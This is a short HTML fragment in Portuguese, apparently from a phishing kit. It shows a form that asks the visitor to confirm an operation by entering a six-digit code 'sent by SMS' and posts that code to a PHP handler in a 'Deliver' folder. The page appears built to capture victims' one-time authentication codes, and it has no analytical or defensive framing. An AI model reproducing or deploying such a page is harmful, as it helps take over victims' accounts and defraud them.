...
<form action="./Deliver/sms_.php" method="POST">
...
<h6 class="vrfy">Para confirmar a operação, insira a chave que enviamos pelo SMS para o seu celular:<br><br></h6>
                        ...
                        <input class="bigger-input mobile-small" placeholder="Código SMS (XXXXXX)" name="cod" type="tel" required maxlength="6" minlength="6">
